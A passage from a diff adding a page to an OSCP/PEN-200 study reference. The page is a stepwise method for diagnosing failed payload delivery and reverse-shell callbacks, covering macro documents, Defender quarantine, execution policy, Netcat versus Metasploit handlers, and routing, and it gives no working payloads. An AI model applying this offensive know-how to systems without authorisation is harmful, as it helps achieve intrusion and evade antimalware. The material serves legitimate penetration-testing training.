+<li>Verify permissions, working directory, execution policy and application-control evidence.</li>
+<li>Start the correct listener/handler and prove its bind.</li>
+<li>Prove the target-to-listener route separately.</li>
+<li>Inspect concrete antimalware, application-control and process-failure evidence.</li>
+<li>Repair session I/O only after a connection exists.</li>
+</ol>
+<p>If step 1 fails, this is not yet a payload problem. Return to the exploit, input parser or execution primitive.</p>
+<h5 id="a-document-delivered-no-callback">A. Document delivered, no callback</h5>
+<pre><code class="language-text">Observed: document exists
+Unknown: opened, macro permitted, child command, network route
+Test: MOTW/policy → harmless marker → child process/download → callback route
+Action: repair first failed gate; do not regenerate the payload first
+</code></pre>
+<h5 id="b-executable-disappears-after-transfer">B. Executable disappears after transfer</h5>
+<pre><code class="language-text">Observed: transfer response succeeded
+Test: destination listing/hash → Defender detection/resource/event
+Interpretation: transfer success is not retention; quarantine requires evidence
+Action: choose a justified alternate execution form or native route, within scope
+</code></pre>
+<h5 id="c-powershell-says-scripts-are-disabled">C. PowerShell says scripts are disabled</h5>
+<pre><code class="language-text">Observed: explicit execution-policy error
+Test: Get-ExecutionPolicy -List and GPO precedence
+Action: use a process-scoped invocation if allowed; do not call this an AMSI result
+</code></pre>
+<h5 id="d-connection-reaches-netcat-but-there-is-no-shell">D. Connection reaches Netcat but there is no shell</h5>
+<pre><code class="language-text">Observed: TCP connection
+Test: generated payload name
+Interpretation: staged payload may have reached a raw listener
+Action: use exact multi/handler or generate a compatible stageless command shell
+</code></pre>
+<h5 id="e-binary-exists-but-returns-not-found-on-linux">E. Binary exists but returns “not found” on Linux</h5>
+<pre><code class="language-text">Observed: path and file exist
+Test: file, readelf interpreter, ldd, shebang
+Interpretation: loader/interpreter dependency may be missing
+Action: build/choose a compatible artifact; do not change callback settings
+</code></pre>
+<h5 id="f-metasploit-module-reports-completion-no-session">F. Metasploit module reports completion, no session</h5>
+<pre><code class="language-text">Observed: module ran
+Test: exact target profile, payload, callback route, handler output and service state
+Interpretation: completion is not verified execution/session
+Action: preserve module output and diagnose the first missing state
+</code></pre>
+<pre><code class="language-text">artifact/request
+→ delivered to intended consumer
+→ required user/trigger action
+→ parser/interpreter/loader
+→ process or bounded side effect
+→ network connection
+→ handler protocol
+→ usable session
+</code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Boundary</th><th>Decisive evidence</th><th>Does not prove</th></tr></thead><tbody><tr><td>Delivery</td><td>Expected bytes, request, document or shortcut arrives intact</td><td>It was opened or parsed</td></tr><tr><td>Trigger</td><td>Intended user/service/parser consumed it</td><td>Child process started</td></tr><tr><td>Execution</td><td>Harmless marker, process or command output</td><td>Callback route works</td></tr><tr><td>Connection</td><td>Expected peer reaches listener</td><td>Payload and handler agree</td></tr><tr><td>Session</td><td>Commands return; host and identity verified</td><td>Stability or privilege</td></tr></tbody></table>
+<p>Do not replace the artifact, payload, listener and route simultaneously. Record the last confirmed boundary and test the next one.</p>
+<h3 id="7-worked-example--hypothetical-8">7. Worked example — hypothetical</h3>
+<p>Observation: the payload executes but no SYN reaches the listener. Test: check advertised address and target route before changing handlers. Illustrative output: the callback uses a non-routed Kali interface. Interpretation: provide the reachable address/forward and retest the same verified primitive.</p>
+<h3 id="8-verify-the-result-8">8. Verify the result</h3>
+<p>Use command proof, packet evidence and actual channel behavior to identify the first failed boundary.</p>
+<h3 id="9-failure-and-fallback-8">9. Failure and fallback</h3>
+<p>A timeout alone is inconclusive. Return to the original trigger if execution is unproved; use handler/TTY repair only after the prior state is confirmed.</p>
+<h3 id="10-next-transitions-8">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/pivoting/#pivot-callback">Build the callback and delivery routes separately from the attack route</a>; <a href="/oscp/notes/methods/execution/#execution-handler">Pair staged payloads with the correct handler and session lifecycle</a>; <a href="/oscp/notes/methods/sessions-transfers/#session-tty">Repair a limited Linux terminal</a>.</p>
+<h2 id="sources-and-shared-concepts">Sources and shared concepts</h2>
+<p>Supplied PEN-200 Ch 12 pp343–374, selected Ch 15 pp416–441 and Ch 21 pp653–704. Current policy is governed by the <a href="https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide">official exam guide</a>.</p>
+<p>Commands and their adjacent variant conditions are synchronized extracts of the linked operational procedures. Those procedures own complete execution details; this guide owns method selection, explanations and worked reasoning. Tool availability on the learner's Kali or a target must be checked in that environment.</p></article><hr><p><a href="#document">Top of document</a> · <a href="/oscp/">Reference home</a></p></main></body></html>
